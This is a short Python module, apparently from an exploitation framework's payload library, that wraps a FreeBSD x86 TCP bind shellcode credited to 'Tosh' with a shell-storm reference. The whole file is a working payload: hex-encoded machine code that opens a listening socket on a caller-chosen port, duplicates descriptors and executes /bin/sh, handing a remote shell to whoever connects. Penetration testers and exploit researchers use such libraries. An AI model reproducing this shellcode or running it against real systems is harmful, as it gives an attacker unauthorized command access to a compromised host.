from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Tosh"
    Shellcode.info["name"] = "FreeBSDx86 - tcp_bind shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-748.php",
    ]

    def __init__(self, **kwargs): 
        Shellcode.info["size"] = 94 + Shellcode().getsize(kwargs["lport"])
        Shellcode.info["payload"] = [
            r"\x31\xc9\xf7\xe1\x51\x40\x50\x40\x50\x50"
            r"\xb0\x61\xcd\x80\x96\x52\x66\x68"
            + kwargs["lport"] +
            r"\x66\x68\x01\x02\x89\xe1\x6a\x10\x51\x56\x50\xb0\x68\xcd"
            r"\x80\x31\xc0\xb0\x05\x50\x56\x50\xb0\x6a\xcd\x80\x31\xc0\x50\x50\x56"
            r"\x50\xb0\x1e\xcd\x80\x97\x31\xc0\x50\xb0\x02\xcd\x80\x09\xc0\x74\xea"
            r"\x31\xc9\x31\xc0\x51\x57\x50\xb0\x5a\xcd\x80\xfe\xc1\x80\xf9\x03\x75"
            r"\xf0\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89"
            r"\xe1\x52\x51\x53\xb0\x3b\x50\xcd\x80"

        ]
